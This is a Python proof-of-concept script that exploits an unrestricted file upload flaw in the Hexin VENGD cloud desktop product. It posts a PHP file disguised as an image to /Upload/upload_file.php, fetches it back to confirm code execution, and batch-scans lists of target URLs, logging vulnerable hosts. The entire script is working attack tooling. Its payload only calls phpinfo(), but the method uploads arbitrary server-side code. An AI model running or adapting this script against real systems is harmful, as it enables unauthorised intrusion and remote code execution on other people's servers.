#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import requests, urllib3, time, re, argparse
from colorama import init
init(autoreset=True)

def title():
    print("")
    print('*'.center(60, '*'))
    print("和信下一代云桌面VENGD（版本未知）".center(40))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(40))
    print("")
    print('*'.center(60, '*'))
    print("")

class VESystem_VENGD_RCE_POC():
    def VENGD_RCE_POC(self, url):
        target_url = f"{url}/Upload/upload_file.php?l=atest"
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
            "accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh; q=0.9, fil; q=0.8",
            "Cookie": "think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
        }
        payload = '''------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="atest.php"
Content-Type: image/avif

afeicome
<?php phpinfo(); ?>
------WebKitFormBoundaryfcKRltGv--'''
        try:
            requests.post(target_url, headers=headers, data=payload, timeout=2)
            try:
                repon_data = requests.get(f"{url}/Upload/atest/atest.php", timeout=2).text
                res = re.search(r"afeicome", repon_data).group()
                if res == "afeicome":
                    print(f"\033[31m[+] {url}存在文件上传漏洞！")
                    with open("VENGD_vuln.txt", "a+") as f:
                        f.writelines(url + "\n")
            except Exception as e:
                print(f"[n] {url}不存在该漏洞。")
                return url
        except Exception as e:
            print(f"[n] {url}请求失败！")
            return url

    def VENGD_RCE_Batch_Check(self, url, file):
        if url:
            return True
        elif file:
            for url in file:
                url = url.replace('\n', '')
                time.sleep(1)
                self.VENGD_RCE_POC(url)

if(__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="VESystem VENGD RCE POC")
    parser.add_argument(
        '-u', '--url', type=str,
        help='Please input target url. eg: https://ip:port'
    )
    parser.add_argument(
        '-f', '--file', type=argparse.FileType('r'),
        help='Please input urls file path. eg: c:\\urls.txt'
    )
    args = parser.parse_args()
    run_POC = VESystem_VENGD_RCE_POC()
    if args.file:
        run_POC.VENGD_RCE_Batch_Check(args.url, args.file)
        print("\n[done] 批量探测完成，请查看：VENGD_vuln.txt")
    if args.url:
        run_POC.VENGD_RCE_POC(args.url)